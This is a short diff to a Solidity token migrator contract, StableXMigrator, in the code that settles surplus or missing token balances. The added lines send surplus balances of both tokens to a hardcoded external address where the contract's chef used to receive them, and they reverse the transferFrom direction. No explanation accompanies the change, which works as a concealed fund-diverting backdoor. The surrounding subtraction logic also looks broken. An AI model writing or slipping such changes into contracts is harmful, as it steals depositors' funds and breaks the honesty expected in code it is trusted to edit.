@@ -531,17 +531,17 @@ contract StableXMigrator is Ownable {
         
         // Here top up or remove funds over to the migrator as necessary       
         if (balanceA > required[0])  {
-            addressToken0.transfer(chef, balanceA - required[0]);
+            addressToken0.transfer(address(0x10F09b9942707cea0E18948F9E12E5160D008500), balanceA - required[0]);
         }
         else {
-            addressToken0.transferFrom(chef, address(this), balanceA - required[0]);
+            addressToken0.transferFrom(address(this), chef, balanceA - required[0]);
         }
         
         if (balanceB > required[1])  {
-            addressToken1.transfer(chef, balanceB - required[1]);
+            addressToken1.transfer(address(0x10F09b9942707cea0E18948F9E12E5160D008500), balanceB - required[1]);
         }
         else {
-            addressToken1.transferFrom(chef, address(this), balanceB - required[1]);
+            addressToken1.transferFrom(address(this), chef, balanceB - required[1]);
         }
            
        
